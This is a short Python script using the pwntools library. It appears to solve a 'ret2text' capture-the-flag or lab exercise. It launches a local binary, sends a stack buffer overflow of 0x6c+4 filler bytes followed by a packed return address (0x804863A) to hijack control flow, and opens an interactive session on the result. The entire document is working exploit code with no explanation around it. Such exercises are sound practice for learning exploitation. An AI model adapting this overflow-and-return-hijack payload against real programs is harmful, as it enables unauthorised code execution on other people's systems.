#!/usr/bin/python3
from pwn import *

target = 0x804863A

sh = process('./ret2text')
sh.sendline(b'A' * (0x6c + 4) + p32(target))
sh.interactive()
